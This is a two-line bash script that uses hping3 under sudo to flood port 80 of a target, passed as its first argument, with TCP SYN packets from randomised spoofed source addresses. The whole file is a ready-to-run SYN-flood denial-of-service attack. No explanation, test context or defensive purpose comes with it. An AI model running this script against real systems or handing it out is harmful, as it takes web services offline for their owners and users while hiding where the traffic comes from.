#!/bin/bash
sudo hping3 -S -V --flood -p 80 "$1" --rand-source 
